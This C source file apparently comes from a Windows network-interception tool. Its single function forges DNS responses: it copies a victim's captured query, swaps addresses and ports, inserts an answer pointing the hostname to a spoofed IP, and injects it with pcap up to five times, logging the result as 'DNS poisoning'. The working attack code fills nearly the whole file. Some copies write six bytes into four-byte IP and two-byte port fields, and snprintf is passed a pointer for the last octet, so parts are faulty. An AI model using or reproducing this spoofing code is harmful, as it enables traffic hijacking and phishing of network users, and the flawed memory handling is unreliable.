#include <stdio.h>
#include <pcap.h>
#include <Windows.h>

#include "APE.h"
#include "LinkedListSpoofedDNSHosts.h"
#include "DnsForge.h"
#include "DnsHelper.h"
#include "DnsRequestSpoofing.h"
#include "DnsStructs.h"



void DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *spoofedIp, char *srcIp, char *dstIp, char *hostName)
{
  unsigned char dstMacBin[BIN_MAC_LEN];
  unsigned char srcMacBin[BIN_MAC_LEN];
  unsigned char srcIpBin[BIN_IP_LEN];
  unsigned char dstIpBin[BIN_IP_LEN];
  char srcIpStr[128];
  char dstIpStr[128];
//  int dnsPacketSize = sizeof(DNS_BASIC) + sizeof(DNS_QUERY) + sizeof(DNS_ANSWER);
  unsigned short dstPort = 0;
  unsigned short srcPort = 0;

  int etherPacketSize = sizeof(ETHDR);
  int ipPacketSize = sizeof(IPHDR);
  int udpPacketSize = sizeof(UDPHDR);
  PETHDR ethrHdr = (PETHDR) rawPacket;
  PIPHDR ipHdr = (PIPHDR)(rawPacket + etherPacketSize);
  PUDPHDR udpHdr = (PUDPHDR)(rawPacket + etherPacketSize + ipPacketSize);
  PDNS_HEADER dnsBasicHdr = NULL;
  PRAW_DNS_DATA responseData = NULL;
  int counter = 0;

unsigned char *spoofedDnsResponse = NULL;
int basePacketSize = etherPacketSize + ipPacketSize + udpPacketSize;
int totalPacketSize = -1;

  // 1. Copy source and destination MAC addresses
  CopyMemory(dstMacBin , ethrHdr->ether_dhost, BIN_MAC_LEN);	
  CopyMemory(srcMacBin , ethrHdr->ether_shost, BIN_MAC_LEN);

  // 2. Copy source and destination IP addresses  
  CopyMemory(dstIpBin, &ipHdr->daddr, BIN_IP_LEN);	
  CopyMemory(srcIpBin, &ipHdr->saddr, BIN_IP_LEN);

  // 3. Copy src(client) and dest(dns server) port  
  dstPort = udpHdr->sport;	// client's port=attack pkt's dest port
  srcPort = udpHdr->dport;	// dns server's port (53)=attack pkt's src port
  
  dnsBasicHdr = (PDNS_HEADER) (rawPacket + basePacketSize);

ZeroMemory(srcIpStr, sizeof(srcIpStr));
ZeroMemory(dstIpStr, sizeof(dstIpStr));
snprintf((char *)srcIpStr, sizeof(srcIpStr) - 1, "%d.%d.%d.%d", ipHdr->saddr.byte1, ipHdr->saddr.byte2, ipHdr->saddr.byte3, &ipHdr->saddr.byte4);
snprintf((char *)dstIpStr, sizeof(dstIpStr) - 1, "%d.%d.%d.%d", ipHdr->daddr.byte1, ipHdr->daddr.byte2, ipHdr->daddr.byte3, &ipHdr->daddr.byte4);

LogMsg(DBG_LOW, "DnsRequestSpoofing(): %s:%d -> %s:%d", srcIpStr, ntohs(srcPort), dstIpStr, ntohs(dstPort));

// 4. Create copy of old data packet OSI layer 2 to 4
if ((spoofedDnsResponse = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, basePacketSize)) == NULL)
{
  return;
}

CopyMemory(spoofedDnsResponse, rawPacket, basePacketSize);
if ((responseData = CreateDnsResponse_A(hostName, dnsBasicHdr->id, spoofedIp)) == NULL)
{
  HeapFree(GetProcessHeap(), 0, spoofedDnsResponse);
  return;
}

if ((spoofedDnsResponse = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, spoofedDnsResponse, basePacketSize + responseData->dataLength)) == NULL)
{
  HeapFree(GetProcessHeap(), 0, spoofedDnsResponse);
  return;
}
CopyMemory(spoofedDnsResponse + basePacketSize, responseData->data, responseData->dataLength);


// 5. Adjust OSI layer 2 to 4
ethrHdr = (PETHDR)spoofedDnsResponse;
ipHdr = (PIPHDR)(spoofedDnsResponse + etherPacketSize);
udpHdr = (PUDPHDR)(spoofedDnsResponse + etherPacketSize + ipPacketSize);

CopyMemory(ethrHdr->ether_dhost, srcMacBin, BIN_MAC_LEN);
CopyMemory(ethrHdr->ether_shost, dstMacBin, BIN_MAC_LEN);

CopyMemory(&ipHdr->daddr, &srcIpBin, BIN_MAC_LEN);
CopyMemory(&ipHdr->saddr, &dstIpBin, BIN_MAC_LEN);

CopyMemory(&udpHdr->dport, &dstPort, BIN_MAC_LEN);
CopyMemory(&udpHdr->sport, &srcPort, BIN_MAC_LEN);

//  // Calculate the total attack packet size
//  packetsize = counter + etherPacketSize + ipPacketSize + udpPacketSize + dnsPacketSize;	
//
//  // Allocate memory for the DNS response packet		
//  if ((dnsPacket = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetsize+1)) == NULL)  
//  {
//    LogMsg(DBG_ERROR, "InjectDNSPacket(): HeapAlloc(%d) failed (Error code: %d)", packetsize+1, GetLastError());
//    goto END;
//  }
//
//  ZeroMemory((char *) dnsPacket, packetsize);	
//
//  // 0. Initialize the packet and copy the IP addr over
//  ulTmp = inet_addr((const char *) dstIp);
//  CopyMemory(&srcAddr, &ulTmp, sizeof(ulTmp));
//  ulTmp = inet_addr((const char *) srcIp);
//  CopyMemory(&dstAddr, &ulTmp, sizeof(ulTmp));
//
//  // 1. Generate ethernet header for lDNSPacket
//  GenerateEtherPacket2(dnsPacket,  (unsigned char *) destMacBin,  (unsigned char *) srcMacBin);
//
//  // 2. Generate IP header for lDNSPacket
//  ipHdr = (PIPHDR) (dnsPacket + etherPacketSize);
//  GenerateIPPacket2((unsigned char *) ipHdr, IPPROTO_UDP, srcAddr, dstAddr, packetsize);
//
//  // 3. Generate UDP header for lDNSPacket
//  udpHdr = (PUDPHDR) ((unsigned char *) ipHdr + ipPacketSize);
//  GenerateUDPPacket2((unsigned char *) udpHdr, packetsize, srcPort, dstPort);
//
//  // 4. Generate DNS header for lDNSPacket
//  dnsAnswerHdr = (PDNS_BASIC) ((unsigned char *) udpHdr + udpPacketSize);
//  GenerateDNSPacket2((unsigned char *) dnsAnswerHdr, counter, dnsUrl, transactionId, spoofedIp);
//
//  ethrHdr = (PETHDR) dnsPacket;
//
  // Keep sending the crafted dns reply packet to client till max 5 times if not successful
  for (counter = 5; counter > 0; counter--) 
  {
printf("DnsRequestSpoofing(): pcap_send() Counter=%d\n", counter);

    if (pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength) != 0)
    {
      LogMsg(DBG_ERROR, "Request DNS poisoning failed : %s -> %s", hostName, spoofedIp);
    }
    else 
    {
      LogMsg(DBG_ERROR, "Request DNS pisoning succeeded : %s -> %s", hostName, spoofedIp);
      break;
    }
  }

//END:
//
//  if (dnsPacket != NULL)
//  {
//    __try
//    {
//      HeapFree(GetProcessHeap(), 0, dnsPacket);
//    }
//    __except (EXCEPTION_EXECUTE_HANDLER)
//    {
//    }
//  }
//
//  if (dnsUrlA != NULL)
//  {
//    __try
//    {
//      HeapFree(GetProcessHeap(), 0, dnsUrlA);
//    }
//    __except (EXCEPTION_EXECUTE_HANDLER)
//    {
//    }
//  }
}
